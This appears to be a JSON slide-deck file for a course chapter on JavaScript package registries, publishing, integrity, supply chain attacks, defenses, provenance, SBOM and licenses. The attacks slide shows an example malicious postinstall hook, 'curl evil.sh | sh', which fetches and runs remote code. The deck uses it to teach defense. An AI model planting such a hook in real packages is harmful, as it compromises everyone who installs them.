{"book":11,"chapter":33,"rubric":"MODERN FRONTEND / BUILD AND PACKAGES / CHAPTER 25","slides":[{"title":"Where packages come from","sub":"Chapter 33 · Registries","short":"Introduction","main":"A registry is a server of package metadata and archives; the manager talks to it over HTTP.","body":[{"t":"scene","labels":["Registry","Request by name","Metadata and archive"],"captions":["A registry is a server with package metadata and archives","GET /package-name returns a document with all versions","The archive URL and checksum come from this document"],"frames":[[{"t":"cell","id":"c","x":70.0,"y":80.0,"w":100.0,"h":40.0,"text":"npm install","tone":"blue","size":10.0,"sub_size":8.5},{"t":"line","id":"e","x1":122.0,"y1":80.0,"x2":188.0,"y2":80.0,"tone":"green","arrow":true,"width":1.6},{"t":"cell","id":"r","x":270.0,"y":80.0,"w":140.0,"h":50.0,"text":"registry\nmetadata + archives","tone":"green","size":9.5,"sub_size":8.5}],[{"t":"code","id":"c~code","x":10.0,"y":40.0,"lines":["GET https://registry.npmjs.org/zod","","{ \"name\": \"zod\", \"versions\": {…}, … }"],"hl":[0],"lang":"js","size":9.5,"lh":22.0,"w":340.0}],[{"t":"cell","id":"m","x":90.0,"y":70.0,"w":150.0,"h":36.0,"text":"document:\nversions, dist-tags","tone":"blue","size":9.5,"sub_size":8.5},{"t":"line","id":"e","x1":168.0,"y1":70.0,"x2":192.0,"y2":70.0,"tone":"green","arrow":true,"width":1.6},{"t":"cell","id":"t","x":280.0,"y":70.0,"w":150.0,"h":36.0,"text":"tarball .tgz\n+ integrity","tone":"green","size":9.5,"sub_size":8.5}]],"cues":[13.2,26.3]}]},{"title":"npm registry","sub":"Metadata and tags","short":"npm registry","main":"Package document: versions, dist-tags (latest, next), dist.tarball and dist.integrity.","body":[{"t":"scene","labels":["versions","dist-tags","dist"],"captions":["Each version has its manifest: dependencies, scripts, license","latest is the default version, next is a prerelease; tags are movable","dist.tarball is the archive URL, dist.integrity is the checksum"],"frames":[[{"t":"code","id":"c","x":10.0,"y":20.0,"lines":["\"versions\": {","  \"3.22.0\": { \"dependencies\": {} },","  \"3.23.8\": { … }","}"],"hl":[1,2],"lang":"js","size":9.5,"lh":22.0,"w":340.0}],[{"t":"code","id":"c","x":10.0,"y":30.0,"lines":["\"dist-tags\": {","  \"latest\": \"3.23.8\",","  \"next\":   \"4.0.0-beta.1\"","}"],"hl":[1,2],"lang":"js","size":10.0,"lh":22.0,"w":340.0}],[{"t":"code","id":"c","x":10.0,"y":20.0,"lines":["\"dist\": {","  \"tarball\": \".../zod/-/zod-3.23.8.tgz\",","  \"integrity\": \"sha512-…\"","}"],"hl":[1,2],"lang":"js","size":9.0,"lh":22.0,"w":340.0}]],"cues":[12.7,25.4]}]},{"title":"JSR","sub":"JavaScript Registry","short":"JSR","main":"JSR: TypeScript-first, ES modules only, source publishing, score and provenance.","body":[{"t":"scene","labels":["Source","ESM only","Package score"],"captions":["You publish TypeScript source: the registry generates types and docs itself","Only ES modules and only semver; works in Deno, Node and browsers","Score: description, docs, runtime support, types, provenance"],"frames":[[{"t":"cell","id":"s","x":90.0,"y":70.0,"w":130.0,"h":36.0,"text":"mod.ts\n(source)","tone":"blue","size":10.0,"sub_size":8.5},{"t":"line","id":"e","x1":156.0,"y1":70.0,"x2":194.0,"y2":70.0,"tone":"green","arrow":true,"width":1.6},{"t":"cell","id":"r","x":280.0,"y":70.0,"w":150.0,"h":36.0,"text":"JSR: .d.ts, docs,\nJS for Node","tone":"green","size":9.5,"sub_size":8.5}],[{"t":"cell","id":"a","x":90.0,"y":70.0,"w":150.0,"h":36.0,"text":"ES modules","tone":"green","size":11.0,"sub_size":8.5},{"t":"cell","id":"b","x":270.0,"y":70.0,"w":150.0,"h":36.0,"text":"CommonJS ✗","tone":"red","size":11.0,"sub_size":8.5}],[{"t":"cell","id":"c0","x":50.0,"y":70.0,"w":60.0,"h":36.0,"text":"description","tone":"green","size":8.0,"sub_size":8.5},{"t":"cell","id":"c1","x":115.0,"y":70.0,"w":60.0,"h":36.0,"text":"docs","tone":"green","size":8.0,"sub_size":8.5},{"t":"cell","id":"c2","x":180.0,"y":70.0,"w":60.0,"h":36.0,"text":"runtimes","tone":"green","size":8.0,"sub_size":8.5},{"t":"cell","id":"c3","x":245.0,"y":70.0,"w":60.0,"h":36.0,"text":"types","tone":"green","size":8.0,"sub_size":8.5},{"t":"cell","id":"c4","x":310.0,"y":70.0,"w":60.0,"h":36.0,"text":"provenance","tone":"green","size":8.0,"sub_size":8.5},{"t":"text","id":"n","x":180.0,"y":120.0,"text":"score 100%","tone":"green","size":11.0}]],"cues":[13.2,26.3]}]},{"title":"Private registries","sub":"Scope and tokens","short":"Private","main":"Scope → own registry in .npmrc; the access token lives in an environment variable.","body":[{"t":"scene","labels":["Scope → registry","Token","Cache"],"captions":["@company:registry in .npmrc sends the scope's packages to your own registry","The token comes from an environment variable — the secret stays out of the repo","A private registry caches public packages: faster and more reliable"],"frames":[[{"t":"code","id":"c","x":10.0,"y":30.0,"lines":["@company:registry=https://npm.company.example/","registry=https://registry.npmjs.org/"],"hl":[0],"lang":"js","size":9.0,"lh":24.0,"w":340.0}],[{"t":"code","id":"c","x":10.0,"y":30.0,"lines":["//npm.company.example/:_authToken=${NPM_TOKEN}","","export NPM_TOKEN=…   # outside the repo"],"hl":[0],"lang":"js","size":9.0,"lh":22.0,"w":340.0}],[{"t":"cell","id":"c~cell","x":60.0,"y":80.0,"w":90.0,"h":40.0,"text":"project","tone":"blue","size":11.0,"sub_size":8.5},{"t":"line","id":"e1","x1":108.0,"y1":80.0,"x2":142.0,"y2":80.0,"tone":"green","arrow":true,"width":1.6},{"t":"cell","id":"p","x":190.0,"y":80.0,"w":90.0,"h":40.0,"text":"private\nregistry","tone":"green","size":9.5,"sub_size":8.5},{"t":"line","id":"e2","x1":238.0,"y1":80.0,"x2":262.0,"y2":80.0,"tone":"green","arrow":true,"width":1.6},{"t":"cell","id":"n","x":320.0,"y":80.0,"w":80.0,"h":40.0,"text":"npmjs.org","tone":"blue","size":9.5,"sub_size":8.5}]],"cues":[12.3,24.6]}]},{"title":"Publishing","sub":"npm publish","short":"Publishing","main":"publish packs files, checks the version and sets a tag; --tag next leaves latest alone.","body":[{"t":"scene","labels":["version","publish","tag next"],"captions":["npm version minor: new number, commit and git tag","npm publish packs files into an archive and sends it to the registry; the version must be new","--tag next: a prerelease does not become latest; 2FA and provenance"],"frames":[[{"t":"code","id":"c","x":10.0,"y":40.0,"lines":["$ npm version minor","v1.4.0","# commit + git tag"],"hl":[0,1],"lang":"js","size":10.0,"lh":22.0,"w":340.0}],[{"t":"code","id":"c","x":10.0,"y":40.0,"lines":["$ npm publish","+ my-lib@1.4.0","$ npm publish   # again","✗ cannot overwrite a version"],"hl":[1],"bad":[3],"lang":"js","size":9.5,"lh":22.0,"w":340.0}],[{"t":"code","id":"c","x":10.0,"y":40.0,"lines":["$ npm publish --tag next","# latest stays 1.3.0","$ npm publish --provenance"],"hl":[0,2],"lang":"js","size":9.5,"lh":22.0,"w":340.0}]],"cues":[12.6,25.3]}]},{"title":"Life of a version","sub":"deprecate and unpublish","short":"Life of a version","main":"A version is never rewritten: mark old ones deprecate; unpublish is strictly limited.","body":[{"t":"scene","labels":["No rewriting","deprecate","unpublish"],"captions":["A bug in a version — release a new one, don't edit the published one","npm deprecate pkg@1.4.0 \"use 1.4.1\": a warning at install time","Deleting is possible in the first 72 hours; later — almost never if there are dependents"],"frames":[[{"t":"cell","id":"a","x":70.0,"y":70.0,"w":100.0,"h":36.0,"text":"1.4.0\nwith a bug","tone":"red","size":10.0,"sub_size":8.5},{"t":"line","id":"e","x1":122.0,"y1":70.0,"x2":148.0,"y2":70.0,"tone":"green","arrow":true,"width":1.6},{"t":"cell","id":"b","x":220.0,"y":70.0,"w":100.0,"h":36.0,"text":"1.4.1\nfixed","tone":"green","size":10.0,"sub_size":8.5}],[{"t":"code","id":"c","x":10.0,"y":30.0,"lines":["$ npm deprecate my-lib@1.4.0 \"use 1.4.1\"","","npm warn deprecated my-lib@1.4.0: use 1.4.1"],"hl":[0,2],"lang":"js","size":9.0,"lh":22.0,"w":340.0}],[{"t":"cell","id":"a","x":90.0,"y":70.0,"w":150.0,"h":36.0,"text":"< 72 hours:\ncan delete","tone":"green","size":9.5,"sub_size":8.5},{"t":"cell","id":"b","x":270.0,"y":70.0,"w":150.0,"h":36.0,"text":"later: only with\nno dependents","tone":"red","size":9.5,"sub_size":8.5}]],"cues":[13.0,26.0]}]},{"title":"Integrity","sub":"SRI and hashes","short":"Integrity","main":"integrity = algorithm-base64 of the archive hash; the lockfile keeps it, the manager checks it.","body":[{"t":"scene","labels":["Archive hash","Check","What it doesn't guarantee"],"captions":["integrity = algorithm-base64 of the archive hash, e.g. sha512-…","After download the manager computes the hash and compares: mismatch — refusal","A hash says \"same file\", not \"safe file\""],"frames":[[{"t":"code","id":"c","x":10.0,"y":40.0,"lines":["\"integrity\": \"sha512-9fXk…Q==\"","//            algorithm-hash (base64)"],"hl":[0],"lang":"js","size":10.0,"lh":24.0,"w":340.0}],[{"t":"cell","id":"a","x":70.0,"y":70.0,"w":100.0,"h":36.0,"text":"downloaded .tgz","tone":"blue","size":10.0,"sub_size":8.5},{"t":"line","id":"e","x1":122.0,"y1":70.0,"x2":148.0,"y2":70.0,"tone":"green","arrow":true,"width":1.6},{"t":"cell","id":"b","x":220.0,"y":70.0,"w":100.0,"h":36.0,"text":"sha512 = ?","tone":"yellow","size":10.0,"sub_size":8.5},{"t":"cell","id":"c~cell","x":330.0,"y":70.0,"w":56.0,"h":36.0,"text":"=","tone":"green","size":13.0,"sub_size":8.5}],[{"t":"cell","id":"a","x":90.0,"y":70.0,"w":150.0,"h":36.0,"text":"archive swapped\nen route ✓ caught","tone":"green","size":9.5,"sub_size":8.5},{"t":"cell","id":"b","x":270.0,"y":70.0,"w":150.0,"h":36.0,"text":"author's malware\n✗ not caught","tone":"red","size":9.5,"sub_size":8.5}]],"cues":[12.2,24.3]}]},{"title":"Supply chain attacks","sub":"What happens","short":"Attacks","main":"Typosquatting, dependency confusion, a hijacked maintainer, malicious install scripts.","body":[{"t":"scene","labels":["Typos","Name swap","Scripts and hijacking"],"captions":["Typosquatting: lodahs instead of lodash — a trap package waits for typos","Dependency confusion: the internal name is taken in the public registry with a higher version","postinstall runs at once; a hijacked author account; protestware releases"],"frames":[[{"t":"cell","id":"a","x":90.0,"y":70.0,"w":130.0,"h":36.0,"text":"lodash","tone":"green","size":12.0,"sub_size":8.5},{"t":"cell","id":"b","x":270.0,"y":70.0,"w":130.0,"h":36.0,"text":"lodahs ✗","tone":"red","size":12.0,"sub_size":8.5}],[{"t":"cell","id":"a","x":90.0,"y":70.0,"w":150.0,"h":36.0,"text":"internal-utils\n1.0.0 (private)","tone":"green","size":9.0,"sub_size":8.5},{"t":"cell","id":"b","x":270.0,"y":70.0,"w":150.0,"h":36.0,"text":"internal-utils\n99.0.0 (public) ✗","tone":"red","size":8.5,"sub_size":8.5}],[{"t":"code","id":"c","x":10.0,"y":40.0,"lines":["\"scripts\": {","  \"postinstall\": \"curl evil.sh | sh\"","}"],"hl":[1],"bad":[1],"lang":"js","size":10.0,"lh":24.0,"w":340.0}]],"cues":[12.5,25.1]}]},{"title":"Defenses","sub":"Dependency hygiene","short":"Defense","main":"Lockfile, npm ci, --ignore-scripts, scopes bound to your registry, fewer dependencies.","body":[{"t":"scene","labels":["Lock and ci","No scripts","Fewer dependencies"],"captions":["Lockfile in the repo and npm ci: a new malicious version won't slip in","npm ci --ignore-scripts wherever install scripts aren't needed","Every dependency is a risk: check age, maintainers, activity"],"frames":[[{"t":"cell","id":"a","x":70.0,"y":70.0,"w":100.0,"h":36.0,"text":"lockfile","tone":"green","size":11.0,"sub_size":8.5},{"t":"line","id":"e","x1":122.0,"y1":70.0,"x2":148.0,"y2":70.0,"tone":"green","arrow":true,"width":1.6},{"t":"cell","id":"b","x":220.0,"y":70.0,"w":100.0,"h":36.0,"text":"npm ci","tone":"green","size":11.0,"sub_size":8.5}],[{"t":"code","id":"c","x":10.0,"y":40.0,"lines":["$ npm ci --ignore-scripts","# or .npmrc: ignore-scripts=true"],"hl":[0,1],"lang":"js","size":10.0,"lh":26.0,"w":340.0}],[{"t":"cell","id":"a","x":90.0,"y":70.0,"w":150.0,"h":36.0,"text":"1 dependency\n= 1 risk","tone":"yellow","size":10.0,"sub_size":8.5},{"t":"cell","id":"b","x":270.0,"y":70.0,"w":150.0,"h":36.0,"text":"10 lines of your\nown code — sometimes better","tone":"green","size":9.5,"sub_size":8.5}]],"cues":[12.5,25.0]}]},{"title":"Provenance and SBOM","sub":"Signatures and contents","short":"Provenance","main":"Provenance ties a package to a commit and build; an SBOM lists the components.","body":[{"t":"scene","labels":["Provenance","SBOM","Response"],"captions":["A signed record: repository, commit, workflow the package was built from","An SBOM is a machine-readable component list (CycloneDX, SPDX)","A new vulnerability is out — the SBOM shows in minutes whether you're affected"],"frames":[[{"t":"cell","id":"c","x":70.0,"y":60.0,"w":100.0,"h":28.0,"text":"commit a1b2…","tone":"blue","size":9.5,"sub_size":8.5},{"t":"cell","id":"w","x":180.0,"y":60.0,"w":100.0,"h":28.0,"text":"workflow","tone":"blue","size":10.0,"sub_size":8.5},{"t":"cell","id":"p","x":290.0,"y":60.0,"w":100.0,"h":28.0,"text":"package","tone":"green","size":10.0,"sub_size":8.5},{"t":"line","id":"e1","x1":122.0,"y1":60.0,"x2":128.0,"y2":60.0,"tone":"green","arrow":true,"width":1.6},{"t":"line","id":"e2","x1":232.0,"y1":60.0,"x2":238.0,"y2":60.0,"tone":"green","arrow":true,"width":1.6},{"t":"text","id":"n","x":180.0,"y":110.0,"text":"Sigstore signs the link","size":9.5}],[{"t":"code","id":"c~code","x":10.0,"y":20.0,"lines":["{ \"bomFormat\": \"CycloneDX\",","  \"components\": [","    { \"name\": \"zod\", \"version\": \"3.23.8\",","      \"purl\": \"pkg:npm/zod@3.23.8\" } ] }"],"hl":[2,3],"lang":"js","size":9.0,"lh":20.0,"w":340.0}],[{"t":"cell","id":"a","x":90.0,"y":70.0,"w":150.0,"h":36.0,"text":"CVE: lodash < 4.17.21","tone":"red","size":9.5,"sub_size":8.5},{"t":"line","id":"e","x1":168.0,"y1":70.0,"x2":192.0,"y2":70.0,"tone":"green","arrow":true,"width":1.6},{"t":"cell","id":"b","x":280.0,"y":70.0,"w":150.0,"h":36.0,"text":"SBOM → 3 products\naffected","tone":"yellow","size":9.5,"sub_size":8.5}]],"cues":[13.5,27.0]}]},{"title":"Licenses","sub":"SPDX","short":"Licenses","main":"License as SPDX identifiers; OR and AND expressions; policy of allowed and denied.","body":[{"t":"scene","labels":["SPDX","OR and AND","Policy"],"captions":["Identifiers are standardized: MIT, Apache-2.0, BSD-3-Clause, GPL-3.0","MIT OR Apache-2.0 — you pick one; A AND B — you comply with both","Policy: allowed, denied, needs approval; checked in CI"],"frames":[[{"t":"cell","id":"l0","x":52.0,"y":80.0,"w":78.0,"h":36.0,"text":"MIT","tone":"green","size":8.5,"sub_size":8.5},{"t":"cell","id":"l1","x":137.0,"y":80.0,"w":78.0,"h":36.0,"text":"Apache-2.0","tone":"green","size":8.5,"sub_size":8.5},{"t":"cell","id":"l2","x":222.0,"y":80.0,"w":78.0,"h":36.0,"text":"BSD-3-Clause","tone":"green","size":8.5,"sub_size":8.5},{"t":"cell","id":"l3","x":307.0,"y":80.0,"w":78.0,"h":36.0,"text":"GPL-3.0","tone":"yellow","size":8.5,"sub_size":8.5}],[{"t":"cell","id":"a","x":90.0,"y":60.0,"w":150.0,"h":30.0,"text":"MIT OR Apache-2.0 → choice","tone":"green","size":9.0,"sub_size":8.5},{"t":"cell","id":"b","x":90.0,"y":105.0,"w":150.0,"h":30.0,"text":"MIT AND GPL-3.0 → both","tone":"yellow","size":9.0,"sub_size":8.5}],[{"t":"cell","id":"a","x":65.0,"y":70.0,"w":110.0,"h":36.0,"text":"allowed:\nMIT, Apache","tone":"green","size":9.5,"sub_size":8.5},{"t":"cell","id":"b","x":180.0,"y":70.0,"w":110.0,"h":36.0,"text":"approval:\nMPL","tone":"yellow","size":9.5,"sub_size":8.5},{"t":"cell","id":"c","x":295.0,"y":70.0,"w":110.0,"h":36.0,"text":"denied:\nAGPL","tone":"red","size":9.5,"sub_size":8.5}]],"cues":[13.0,26.0]}]},{"title":"How to choose a package","sub":"Criteria","short":"Choosing a package","main":"Maintenance, dependencies, size, license, types, activity — and \"do we need it at all\".","body":[{"t":"scene","labels":["Needed?","Health","Cost"],"captions":["Do you need a dependency: ten lines of your own code are sometimes safer","Who maintains it, are releases fresh, how fast are issues closed","Size, number of dependencies, license, types, replacement"],"frames":[[{"t":"cell","id":"a","x":90.0,"y":70.0,"w":150.0,"h":36.0,"text":"left-pad in 11 lines","tone":"green","size":10.0,"sub_size":8.5},{"t":"cell","id":"b","x":270.0,"y":70.0,"w":150.0,"h":36.0,"text":"+ 50 dependencies ✗","tone":"red","size":10.0,"sub_size":8.5}],[{"t":"cell","id":"a","x":65.0,"y":70.0,"w":110.0,"h":36.0,"text":"latest\nrelease","tone":"blue","size":10.0,"sub_size":8.5},{"t":"cell","id":"b","x":180.0,"y":70.0,"w":110.0,"h":36.0,"text":"maintainers","tone":"blue","size":10.0,"sub_size":8.5},{"t":"cell","id":"c","x":295.0,"y":70.0,"w":110.0,"h":36.0,"text":"issues","tone":"blue","size":10.0,"sub_size":8.5}],[{"t":"cell","id":"a","x":65.0,"y":70.0,"w":110.0,"h":36.0,"text":"size","tone":"yellow","size":10.0,"sub_size":8.5},{"t":"cell","id":"b","x":180.0,"y":70.0,"w":110.0,"h":36.0,"text":"license","tone":"yellow","size":10.0,"sub_size":8.5},{"t":"cell","id":"c","x":295.0,"y":70.0,"w":110.0,"h":36.0,"text":"types","tone":"yellow","size":10.0,"sub_size":8.5}]],"cues":[12.5,25.0]}]},{"title":"Summary","sub":"Registries and security","short":"Summary","main":"A registry serves metadata and archives; the supply chain is a risk zone you must protect.","body":[{"t":"scene","labels":["Registries","Security","Next"],"captions":["npm and JSR; private registries by scope; semver publishing with tags","Integrity, lockfile, provenance, SBOM, license policy and careful package choice","Next topic — bundlers: how code becomes a bundle"],"frames":[[{"t":"cell","id":"a","x":65.0,"y":60.0,"w":110.0,"h":28.0,"text":"npm  JSR","tone":"green","size":10.0,"sub_size":8.5},{"t":"cell","id":"b","x":180.0,"y":60.0,"w":110.0,"h":28.0,"text":"scope → registry","tone":"green","size":9.5,"sub_size":8.5},{"t":"cell","id":"c","x":295.0,"y":60.0,"w":110.0,"h":28.0,"text":"publish + tags","tone":"green","size":9.5,"sub_size":8.5}],[{"t":"cell","id":"a","x":65.0,"y":60.0,"w":110.0,"h":28.0,"text":"integrity","tone":"blue","size":10.0,"sub_size":8.5},{"t":"cell","id":"b","x":180.0,"y":60.0,"w":110.0,"h":28.0,"text":"provenance","tone":"blue","size":10.0,"sub_size":8.5},{"t":"cell","id":"c","x":295.0,"y":60.0,"w":110.0,"h":28.0,"text":"SBOM","tone":"blue","size":10.0,"sub_size":8.5}],[{"t":"cell","id":"a","x":70.0,"y":70.0,"w":100.0,"h":36.0,"text":"modules","tone":"blue","size":11.0,"sub_size":8.5},{"t":"line","id":"e","x1":122.0,"y1":70.0,"x2":148.0,"y2":70.0,"tone":"green","arrow":true,"width":1.6},{"t":"cell","id":"b","x":220.0,"y":70.0,"w":100.0,"h":36.0,"text":"bundle","tone":"green","size":11.0,"sub_size":8.5}]],"cues":[14.2,28.4]}]}]}